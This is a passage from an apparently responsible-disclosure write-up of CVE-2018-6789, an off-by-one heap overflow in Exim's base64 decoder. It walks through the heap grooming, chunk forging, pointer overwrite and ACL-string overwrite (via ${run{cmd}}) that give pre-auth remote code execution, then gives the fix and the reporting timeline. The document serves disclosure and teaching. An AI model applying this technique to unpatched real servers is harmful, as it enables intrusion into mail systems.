&lt;p&gt;As shown above, exim allocates a buffer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3*(len/4)+1&lt;/code&gt; bytes to store decoded base64 data. However, when the input is not a valid base64 string and the length is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4n+3&lt;/code&gt;, exim allocates &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3n+1&lt;/code&gt; but consumes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3n+2&lt;/code&gt; bytes while decoding. This causes one byte heap overflow (aka off-by-one).
Generally, this bug is harmless because the memory overwritten is usually unused. However, this byte overwrites some critical data when the string fits some specific length. In addition, this byte is controllable, which makes exploitation more feasible.
Base64 decoding is such a fundamental function and therefore this bug can be triggered easily, causing remote code execution.
&lt;a id=&quot;back&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;To estimate the severity of this bug, we developed an exploit targeting SMTP daemon of exim. The exploitation mechanism used to achieve pre-auth remote code execution is described in the following paragraphs. In order to leverage this one byte overflow, it is necessary to trick memory management mechanism. It is highly recommended to have basic knowledge of heap exploitation &lt;a href=&quot;#heap_exp&quot;&gt;[ref]&lt;/a&gt; before reading this section.&lt;/p&gt;

&lt;p&gt;We developed the exploit with:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Debian(stretch)&lt;/strong&gt; and &lt;strong&gt;Ubuntu(zesty)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SMTP daemon of Exim4 package&lt;/strong&gt; installed with apt-get (4.89/4.88)&lt;/li&gt;
  &lt;li&gt;Config enabled (uncommented in default config) &lt;strong&gt;CRAM-MD5 authenticator&lt;/strong&gt; (any other authenticator using base64 also works)&lt;/li&gt;
  &lt;li&gt;Basic SMTP commands (&lt;strong&gt;EHLO, MAIL FROM/RCPT TO&lt;/strong&gt;) and &lt;strong&gt;AUTH&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;memory-allocation&quot;&gt;Memory allocation&lt;/h4&gt;

&lt;p&gt;First, we review the source code and search for useful memory allocation. As we mentioned in the &lt;a href=&quot;&quot;&gt;previous article&lt;/a&gt;, exim uses self-defined functions for dynamic allocation:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BOOL&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_extend_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* The */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_free_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* value of the */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;store_get_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* 2nd arg is   */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;store_get_perm_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* __FILE__ in  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;store_malloc_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;      &lt;span class=&quot;cm&quot;&gt;/* every call,  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_release_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;cm&quot;&gt;/* so give its  */&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;    &lt;span class=&quot;nf&quot;&gt;store_reset_3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* correct type */&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;free()&lt;/code&gt; of glibc directly. Glibc takes a slightly bigger (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes) &lt;strong&gt;chunk&lt;/strong&gt; and stores its metadata in the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; bytes (x86-64) on every allocation, and then returns the location of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt;. The following illustration describes structure of chunk:
&lt;img src=&quot;/assets/img/blog/20180306/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Metadata includes size of previous chunk (the one exactly above in memory), size of current block and some flags. The first three bits of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;size&lt;/code&gt; are used to store flags. In this example, size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x81&lt;/code&gt; implies current chunk is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80&lt;/code&gt; bytes and the previous chunk is in use.
Most of released chunks used in exim are put into a doubly linked list called &lt;strong&gt;unsorted bin&lt;/strong&gt;. Glibc maintains it according to the flags, and merges adjacent released chunks into a bigger chunk to avoid fragmentation. For every allocation request, glibc checks these chunks in an FIFO (first in, first-out) order and reuses the chunks.&lt;/p&gt;

&lt;p&gt;For some performance issues, exim maintains its own linked list structure with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_extend()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt;.
&lt;img src=&quot;/assets/img/blog/20180306/2.png&quot; alt=&quot;architecture of storeblock&quot; /&gt;
The main feature of storeblocks is that every block is at least &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2000&lt;/code&gt; bytes, which becomes a restriction to our exploitation. Note that a storeblock is also the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;data&lt;/code&gt; of a chunk. Therefore, if we look into the memory, it is like:
&lt;img src=&quot;/assets/img/blog/20180306/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we list functions used to arrange heap data:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;EHLO hostname
  For each EHLO(or HELO) command, exim stores the pointer of hostname in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_free()&lt;/code&gt; old name&lt;/li&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_malloc()&lt;/code&gt; for new name&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L1833&quot;&gt;smtp_in.c: 1833 check_helo&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;1839&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Discard any previous helo name */&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1840&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1841&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1842&lt;/span&gt;   &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1843&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;store_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1844&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1845&lt;/span&gt;   &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1884&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender_helo_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string_copy_malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;1885&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Unrecognized command
  For every unrecognized command with unprintable characters, exim allocates a buffer to convert it to printable
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; to store error message&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L5725&quot;&gt;smtp_in.c: 5725 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;mi&quot;&gt;5725&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;mi&quot;&gt;5726&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;unrecognized command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;AUTH
  In most authentication procedure, exim uses base64 encoding to communicate with client. The encode and decode string are stored in a buffer allocated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; for strings&lt;/li&gt;
      &lt;li&gt;can contain unprintable characters, NULL bytes&lt;/li&gt;
      &lt;li&gt;not necessarily null terminated&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Reset in EHLO/HELO, MAIL, RCPT
  When a command is done correctly, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is called. This function calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset block chain to a &lt;strong&gt;reset point&lt;/strong&gt;, which means all storeblocks allocated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; after last command are released.
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_reset()&lt;/code&gt; to reset point (set at the beginning of function)&lt;/li&gt;
      &lt;li&gt;release blocks added at a time&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;&lt;a href=&quot;https://github.com/Exim/exim/blob/master/src/src/smtp_in.c#L3771&quot;&gt;smtp_in.c: 3771 smtp_setup_msg&lt;/a&gt;&lt;/p&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  3771 int
  3772 smtp_setup_msg(void)
  3773 {
  3774 int done = 0;
  3775 BOOL toomany = FALSE;
  3776 BOOL discarded = FALSE;
  3777 BOOL last_was_rej_mail = FALSE;
  3778 BOOL last_was_rcpt = FALSE;
  3779 void *reset_point = store_get(0);
  3780
  3781 DEBUG(D_receive) debug_printf(&quot;smtp_setup_msg entered\n&quot;);
  3782
  3783 /* Reset for start of new message. We allow one RSET not to be counted as a
  3784 nonmail command, for those MTAs that insist on sending it between every
  3785 message. Ditto for EHLO/HELO and for STARTTLS, to allow for going in and out of
  3786 TLS between messages (an Exim client may do this if it has messages queued up
  3787 for the host). Note: we do NOT reset AUTH at this point. */
  3788
  3789 smtp_reset(reset_point);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;exploit-steps&quot;&gt;Exploit steps&lt;/h4&gt;
&lt;p&gt;To leverage this off-by-one, the chunk beneath decoded base64 data should be freed easily and controllable. After several attempts, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; is a better choice. We arrange the heap layout to leave a freed chunk above &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sender_host_name&lt;/code&gt; for the base64 data.
&lt;img src=&quot;/assets/img/blog/20180306/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Put a huge chunk into unsorted bin
 First of all, we send a EHLO message with huge hostname to make it allocate and deallocate, leaving a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6060&lt;/code&gt; length (3 storeblocks long) chunk in unsorted bin.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the first storeblock
 Then we send an unrecognized string to trigger &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get()&lt;/code&gt; and allocate a storeblock inside the freed chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Cut the second storeblock and release the first one
 We send a EHLO message again to get the second storeblock. The first block is freed sequentially because of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; called after EHLO is done.&lt;/p&gt;

    &lt;p&gt;After the heap layout is prepared, we can use the off-by-one to overwrite the original chunk size. We modify &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x2021&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20f1&lt;/code&gt;, which slightly extends the chunk.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Send base64 data and trigger off-by-one
 To trigger off-by-one, we start an AUTH command to send base64 data. The overflow byte precisely overwrites the first byte of next chunk and extends the next chunk.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Forge a reasonable chunk size
 Because the chunk is extended, the start of next chunk of is changed to somewhere inside of the original one. Therefore, we need to make it &lt;strong&gt;seems like&lt;/strong&gt; a normal chunk to pass sanity checks in glibc. We send another base64 string here, because it requires &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt; byte and unprintable character to forge chunk size.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Release the extended chunk
 To control the content of extended chunk, we need to release the chunk first because we cannot edit it directly. That is, we should send a new EHLO message to release the old host name. However, normal EHLO message calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset&lt;/code&gt; after it succeeds, which possibly makes program abort or crash. To avoid this, we send an &lt;strong&gt;invalid&lt;/strong&gt; host name such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a+&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt;&lt;/strong&gt; pointer of overlapped storeblock&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/20180306/6.png&quot; alt=&quot;&quot; /&gt;
 After the chunk is released, we can retrieve it with AUTH and overwrite part of overlapped storeblock. Here we use a trick called &lt;strong&gt;partial write&lt;/strong&gt;. With this, we can modify the pointer without breaking &lt;strong&gt;ASLR&lt;/strong&gt; (Address space layout randomization). We partially changed the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt; pointer to a storeblock containing ACL (Access Control List) strings. The ACL strings are pointed by a set of global pointers such as:&lt;/p&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_etrn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_expn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_helo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_quit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;acl_smtp_rcpt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;These pointers are initialized at the beginning of exim process, set according to the configure. For example, if there is a line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_smtp_mail = acl_check_mail&lt;/code&gt; in the configure, the pointer &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_smtp_mail&lt;/code&gt; points to the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt;. Whenever MAIL FROM is used, exim performs an ACL check, which expands &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acl_check_mail&lt;/code&gt; first. While expanding, exim tries to execute commands if it encounters &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${run{cmd}}&lt;/code&gt;, so we achieve code execution as long as we control the ACL strings. In addition, we do not need to hijack program control flow directly and therefore we can bypass mitigations such as &lt;strong&gt;PIE&lt;/strong&gt; (Position Independent Executables), &lt;strong&gt;NX&lt;/strong&gt; easily.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Reset storeblocks and retrieve the ACL storeblock
 Now the ACL storeblock is in the linked list chain. It will be released once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smtp_reset()&lt;/code&gt; is triggered, and then we can retrieve it again by allocating multiple blocks.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Overwrite ACL strings and trigger ACL check
 Finally, we overwrite the whole block containing ACL strings. Now we send commands such as EHLO, MAIL, RCPT to trigger ACL checks. Once we touch an acl defined in the configure, we achieve remote code execution.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;fix&quot;&gt;Fix&lt;/h2&gt;
&lt;p&gt;Upgrade to 4.90.1 or above&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;5 February, 2018 09:10 Reported to Exim&lt;/li&gt;
  &lt;li&gt;6 February, 2018 23:23 CVE received&lt;/li&gt;
  &lt;li&gt;10 February, 2018 18:00 Patch released&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;credits&quot;&gt;Credits&lt;/h2&gt;
&lt;p&gt;Vulnerabilities found by Meh, DEVCORE research team.
meh [at] devco [dot] re&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;

&lt;p&gt;https://exim.org/static/doc/security/CVE-2018-6789.txt
https://git.exim.org/exim.git/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6789
http://www.openwall.com/lists/oss-security/2018/02/07/2&lt;/p&gt;

&lt;p&gt;&lt;a id=&quot;heap_exp&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;heap-exploitation-materials-return&quot;&gt;Heap exploitation materials &lt;a href=&quot;#back&quot;&gt;[return]&lt;/a&gt;&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://heap-exploitation.dhavalkapil.com/&quot;&gt;Heap Exploitation&lt;/a&gt;: A tutorial of heap exploitation by Dhaval Kapil&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/shellphish/how2heap&quot;&gt;how2heap&lt;/a&gt;: A repo for learning heap exploitation by Shellphish&lt;/li&gt;
